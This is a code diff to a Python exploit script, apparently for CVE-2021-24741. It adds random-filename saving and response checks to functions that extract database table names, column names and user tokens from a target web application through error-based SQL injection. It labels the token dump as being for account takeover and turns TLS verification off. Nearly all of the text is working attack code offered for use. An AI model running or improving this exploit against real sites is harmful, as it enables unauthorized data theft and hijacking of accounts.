@@ -4,6 +4,7 @@
 
 import requests
 import random
+import os
 from colorama import init, Fore
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -34,21 +35,22 @@ class exploit:
         self.tokens = []
         self.divider = "---------------------"
 
-    def save(self):
-        new_file = open("content.txt", "w")
-        new_file.write("Tables Found on The Database\n")
-        for table in self.tables:
-            new_file.write(table + "\n")
-        new_file.write("\n\nColumns In the Table")
-        new_file.write(self.divider + "\n")
-        new_file.write(self.tables[0] + '\n')
-        new_file.write(self.divider + "\n")
-        for column in self.columns:
-            new_file.write(column + "\n")
-        new_file.close()
+    def save_to_random_file(self):
+        # Generate a random filename
+        random_filename = f"{random.randint(1000, 9999)}_dump.txt"
+        with open(random_filename, "w") as new_file:
+            new_file.write("Tables Found on The Database\n")
+            for table in self.tables:
+                new_file.write(table + "\n")
+            new_file.write("\n\nColumns In the Table\n")
+            new_file.write(self.divider + "\n")
+            new_file.write(self.tables[0] + '\n')
+            new_file.write(self.divider + "\n")
+            for column in self.columns:
+                new_file.write(column + "\n")
+        print(green + f"\nData saved to {random_filename}")
 
     def get_tables(self, profile_url):
-        print("\n" + blue + self.divider + "\n" + red + "DUMPING TABLES" + "\n" + blue + self.divider)
         i = 0
         while True:
             headers = {
@@ -64,25 +66,21 @@ class exploit:
             try:
                 response = requests.post(profile_url, headers=headers, cookies=self.cookies, data=data, verify=False)
                 response = response.text
+                # Validate the response to avoid false positives
+                if "Malformed" in response or "success,false" in response:
+                    break
                 response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
                 response = response.replace('[', '').replace(']', '').replace("'", '').replace('"', '').replace('.', '').replace(' ', '')
-                print(magenta + response)
                 self.tables.append(response)
                 i += 1
-                if "success,false" in response:
-                    self.tables.pop()
-                    break
             except Exception as e:
                 print(red + f"Error in get_tables: {e}")
                 return False  # Exit this method but continue scanning
-
-        print("Tables Found " + white + str(self.tables))
 
     def get_columns(self, profile_url):
         lines = 0
         c = 1
         i = 0
-        print("\n" + blue + self.divider + "\n" + red + self.tables[0] + "\n" + blue + self.divider)
         while lines < len(self.tables):
             while True:
                 headers = {
@@ -98,6 +96,9 @@ class exploit:
                 try:
                     response = requests.post(profile_url, headers=headers, cookies=self.cookies, data=data, verify=False)
                     response = response.text
+                    # Validate the response to avoid false positives
+                    if "Malformed" in response or "success,false" in response:
+                        break
                     response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
                     response = response.replace('[', '').replace(']', '').replace("'", '').replace('"', '').replace('.', '').replace(' ', '')
                     self.columns.append(response)
@@ -106,21 +107,16 @@ class exploit:
                         self.columns.append(self.divider)
                         self.columns.append(self.tables[c])
                         self.columns.append(self.divider)
-                        print("\n" + blue + self.divider + "\n" + red + self.tables[c] + "\n" + blue + self.divider)
                         c += 1
                         lines += 1
-                    if "success,false" in response:
-                        self.columns.pop()
-                        break
                 except Exception as e:
                     print(red + f"Error in get_columns: {e}")
-                    return False # Exit this method but continue scanning
+                    return False  # Exit this method but continue scanning
             break
 
     def get_tokens(self, profile_url, path):
         final_path = path.replace("admin.php", "include/ajax.php")
         final_profile_url = "{0}{1}".format(profile_url, final_path)
-        print("\n" + blue + self.divider + "\n" + red + "Dumping Tokens For Account TakeOver" + "\n" + blue + self.divider)
         i = 0
         try:
             headers = {
@@ -135,6 +131,9 @@ class exploit:
             }
             response = requests.post(final_profile_url, headers=headers, cookies=self.cookies, data=data, verify=False)
             response = response.text
+            # Validate response to avoid false positives
+            if "Malformed" in response or "success,false" in response:
+                return
             response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
             response = response.replace('testtesttesttest', '').replace('[', '').replace(']', '').replace("'", '').replace('"', '').replace('.', '').replace(' ', '')
             self.database.append(response)
@@ -152,24 +151,22 @@ class exploit:
                 }
                 response = requests.post(final_profile_url, headers=headers, cookies=self.cookies, data=data, verify=False)
                 response = response.text
+                if "Malformed" in response or "success,false" in response:
+                    break
                 response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
                 response = response.replace('[', '').replace(']', '').replace("'", '').replace('"', '').replace('.', '').replace(' ', '')
                 self.tokens.append(response)
                 i += 1
-                if "success,false" in response:
-                    self.tokens.pop()
-                    break
-                print(blue + response)
 
-            print(red + "\nSaving the Tokens into File")
-            print(red + "Tokens Saved Into tokens.txt\n")
-            new_file = open("tokens.txt", "w")
-            new_file.write(self.divider + "\n")
-            new_file.write("Tokens Found on The Database\n")
-            new_file.write(self.divider + "\n")
-            for token in self.tokens:
-                new_file.write(token + "\n")
-            new_file.close()
+            # Save tokens to file
+            random_filename = f"tokens_{random.randint(1000, 9999)}.txt"
+            with open(random_filename, "w") as new_file:
+                new_file.write(self.divider + "\n")
+                new_file.write("Tokens Found on The Database\n")
+                new_file.write(self.divider + "\n")
+                for token in self.tokens:
+                    new_file.write(token + "\n")
+            print(green + f"\nTokens saved to {random_filename}")
         except Exception as e:
             print(red + f"Error in get_tokens: {e}")
             return False
@@ -179,3 +176,5 @@ def scan_cve_2021_24741(target):
     exploiter.get_tables(target)
     exploiter.get_columns(target)
     exploiter.get_tokens(target, "admin.php")
+    exploiter.save_to_random_file()
+
